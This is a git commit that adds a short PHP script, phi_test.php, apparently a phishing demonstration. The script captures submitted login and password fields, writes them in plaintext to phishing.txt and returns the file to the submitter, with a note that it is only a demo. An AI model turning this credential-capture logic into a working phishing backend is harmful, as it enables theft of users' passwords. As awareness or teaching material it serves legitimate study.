ac56d2f337b9c09bcefead28ea2f7c8835fa1e6a
Mateus Ferreira <121569308+Mateus-53@users.noreply.github.com>
2023-05-07 13:48:30 -0300

    customizations and features

---
+++ php/phi_test.php
@@ -0,0 +1,15 @@
+<?php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $login = $_POST['login'];
+    $password = $_POST['password'];
+    $content = "Dados coletados!\n\nLogin: $login;\nPassword: $password;\n\nObservação: Isso é apenas uma demonstração";
+
+    $arquivo = fopen('phishing.txt', 'w');
+    fwrite($arquivo, $content);
+    fclose($arquivo);
+
+    header('Content-Disposition: attachment; filename="phishing.txt"');
+    header('Content-Type: text/plain');
+    readfile('phishing.txt');
+    exit;
+  }
